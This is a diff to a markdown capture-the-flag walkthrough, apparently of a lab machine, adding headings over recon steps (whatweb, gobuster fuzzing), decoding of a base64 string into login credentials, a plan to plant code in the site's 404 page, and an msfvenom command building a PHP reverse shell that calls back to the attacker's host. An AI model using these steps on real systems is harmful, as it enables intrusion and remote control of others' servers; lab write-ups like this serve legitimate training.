@@ -21,6 +21,7 @@ whatweb http://10.10.223.160
 ![image](https://github.com/user-attachments/assets/f44e3359-cc74-4743-b2c9-c5f3c9e20e4b)
 We did not find anything that could help us
 
+## **Fuzzing Web**
 ```bash
 gobuster dir -u http://10.10.223.160/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
 ```
@@ -36,14 +37,18 @@ gobuster dir -u http://10.10.223.160/ -w /usr/share/wordlists/dirbuster/director
 ![image](https://github.com/user-attachments/assets/959d45f4-1b81-484e-975c-ae19f5b99582)<br>
 ![image](https://github.com/user-attachments/assets/c17c5f8b-fb24-4b15-9f33-20ce7e32b5fb)
 
+## **We found several hidden pages, but in one we found a hash64**
 ```bash
 echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
 ```
 ![image](https://github.com/user-attachments/assets/e5b4b107-1390-43e1-b5d5-653e80accca0)<br>
 elliot:ER28-0652<br>
 ![image](https://github.com/user-attachments/assets/6af5ebc6-25f7-439c-9cd1-0b48cd970cfe)
+
+## **We are going to modify a part of the web in this case the error 404 that when entering a site that does not exist, a code that we will create will be executed and it will return a shell that we will intercept later.**
 ![image](https://github.com/user-attachments/assets/4bf0c610-9e79-4be4-8b80-c4b3e426c666)
 
+## **Creating the malicious code**
 ```bash
 msfvenom -p php/reverse_php LHOST=10.21.118.81 LPORT=443 -f raw > pwned.php
 ```
